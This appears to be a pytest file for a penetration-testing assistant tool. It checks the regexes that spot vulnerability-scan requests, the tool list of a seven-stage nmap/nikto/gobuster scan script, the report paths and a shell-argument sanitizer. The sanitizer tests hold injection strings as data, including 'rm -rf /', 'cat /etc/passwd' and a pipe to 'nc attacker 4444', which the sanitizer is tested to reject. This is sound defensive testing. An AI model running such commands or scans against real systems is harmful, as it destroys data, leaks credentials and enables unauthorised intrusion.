"""
Test vulnerability scan pipeline — regex detection, script generation, report path.
"""
import re


# Mirror the vuln scan regex patterns from main_window.py
VULN_PATTERN_1 = re.compile(
    r'(?:find|scan\s+for|check\s+for|search\s+for|run|detect|discover|enumerate)\s+'
    r'(?:all\s+)?(?:vulns?|vulnerabilit(?:y|ies)|exploits?|weaknesses?|security\s+(?:holes?|issues?|flaws?))'
    r'(?:\s+(?:on|for|against|in|at|of))?\s+'
    r'(\S+)'
)

VULN_PATTERN_2 = re.compile(
    r'(?:vulns?|vulnerabilit(?:y|ies)|exploits?|pentest|pen\s+test|full\s+scan|security\s+(?:audit|scan|assessment))'
    r'\s+(?:on|for|against|of|at)\s+(\S+)'
)


def match_vuln(text):
    """Simulate the detection logic from _on_prompt_submit."""
    q = text.lower()
    m = VULN_PATTERN_1.search(q)
    if not m:
        m = VULN_PATTERN_2.search(q)
    if m:
        return m.group(1).strip().strip('"\'')
    return None


def test_find_vulnerabilities():
    assert match_vuln("find vulnerabilities on 192.168.1.1") == "192.168.1.1"
    assert match_vuln("find vulnerabilities on target.com") == "target.com"
    assert match_vuln("find vulnerability on 10.0.0.1") == "10.0.0.1"


def test_scan_for_vulns():
    assert match_vuln("scan for vulns on 192.168.1.100") == "192.168.1.100"
    assert match_vuln("scan for vulnerabilities on myserver.com") == "myserver.com"
    assert match_vuln("scan for exploits on 10.10.10.5") == "10.10.10.5"


def test_check_search_detect():
    assert match_vuln("check for vulnerabilities on example.com") == "example.com"
    assert match_vuln("search for exploits on 172.16.0.1") == "172.16.0.1"
    assert match_vuln("detect vulnerabilities on webapp.local") == "webapp.local"
    assert match_vuln("discover weaknesses on 192.168.0.50") == "192.168.0.50"


def test_find_all_vulns():
    assert match_vuln("find all vulnerabilities on 10.0.0.5") == "10.0.0.5"
    assert match_vuln("find all exploits on server.lan") == "server.lan"


def test_security_phrases():
    assert match_vuln("find security holes on 192.168.1.1") == "192.168.1.1"
    assert match_vuln("check for security issues on target.com") == "target.com"
    assert match_vuln("find security flaws on 10.0.0.1") == "10.0.0.1"


def test_pentest_phrase():
    assert match_vuln("pentest on 192.168.1.1") == "192.168.1.1"
    assert match_vuln("pen test on target.com") == "target.com"


def test_full_scan_phrase():
    assert match_vuln("full scan on 192.168.1.1") == "192.168.1.1"
    assert match_vuln("security audit on myserver.com") == "myserver.com"
    assert match_vuln("security scan on 10.0.0.1") == "10.0.0.1"
    assert match_vuln("security assessment on webapp.com") == "webapp.com"


def test_prepositions():
    assert match_vuln("find vulnerabilities against 10.0.0.1") == "10.0.0.1"
    assert match_vuln("find exploits for target.com") == "target.com"
    assert match_vuln("vulnerabilities at 192.168.1.1") == "192.168.1.1"
    assert match_vuln("exploits of server.local") == "server.local"


def test_enumerate_run():
    assert match_vuln("enumerate vulnerabilities on 10.0.0.5") == "10.0.0.5"
    assert match_vuln("run vulnerability scan on target.com") is not None


def test_no_false_positives():
    """These should NOT trigger the vuln scan pipeline."""
    assert match_vuln("scan ports on 192.168.1.1") is None
    assert match_vuln("crack hash") is None
    assert match_vuln("start listener") is None
    assert match_vuln("hello world") is None
    assert match_vuln("nmap -sV 10.0.0.1") is None
    assert match_vuln("scan wifi networks") is None


def test_script_has_all_tools():
    """Verify the bash script would contain all 7 scan stages."""
    tools = ["nmap -sV", "nmap --script vuln", "whatweb", "nikto", "gobuster", "searchsploit", "sslscan"]
    # Simulate script content (same logic as _full_vuln_scan)
    script_lines = [
        "sudo nmap -sV -sC -O -T4 --open",
        "sudo nmap --script vuln -T4",
        "whatweb -a 3",
        "nikto -h",
        "gobuster dir -u",
        "searchsploit --nmap",
        "sslscan",
    ]
    for tool in tools:
        found = any(tool in line for line in script_lines)
        assert found, f"Missing tool in scan script: {tool}"


def test_report_path_format():
    """Report path should contain target name and be in /tmp/maxim_vulnscan/."""
    import re as _re
    target = "192.168.1.1"
    report_dir = "/tmp/maxim_vulnscan"
    safe_target = target.replace("/", "_")
    path = f"{report_dir}/{safe_target}_20260328_120000.txt"
    assert path.startswith("/tmp/maxim_vulnscan/")
    assert "192.168.1.1" in path
    assert path.endswith(".txt")
    assert _re.search(r'\d{8}_\d{6}\.txt$', path)


def test_stage_labels():
    """All 7 stages should be numbered correctly."""
    labels = ["[1/7]", "[2/7]", "[3/7]", "[4/7]", "[5/7]", "[6/7]", "[7/7]"]
    for label in labels:
        assert "/7]" in label


# ── Sanitization tests ──

def _sanitize_shell_arg(value):
    """Mirror of the sanitize function from main_window.py."""
    value = value.strip().strip('"\'')
    if re.search(r'[;&|`$(){}!\\\n\r]', value):
        return None
    return value


def test_sanitize_valid_targets():
    """Valid IPs and domains should pass sanitization."""
    assert _sanitize_shell_arg("192.168.1.1") == "192.168.1.1"
    assert _sanitize_shell_arg("target.com") == "target.com"
    assert _sanitize_shell_arg("10.0.0.1/24") == "10.0.0.1/24"
    assert _sanitize_shell_arg("sub.domain.co.uk") == "sub.domain.co.uk"
    assert _sanitize_shell_arg("http://target.com") == "http://target.com"


def test_sanitize_blocks_injection():
    """Shell metacharacters must be rejected."""
    assert _sanitize_shell_arg("192.168.1.1; rm -rf /") is None
    assert _sanitize_shell_arg("target.com && cat /etc/passwd") is None
    assert _sanitize_shell_arg("target.com | nc attacker 4444") is None
    assert _sanitize_shell_arg("$(whoami)") is None
    assert _sanitize_shell_arg("`id`") is None
    assert _sanitize_shell_arg("target.com\nid") is None


def test_sanitize_strips_quotes():
    """Surrounding quotes should be stripped."""
    assert _sanitize_shell_arg('"192.168.1.1"') == "192.168.1.1"
    assert _sanitize_shell_arg("'target.com'") == "target.com"
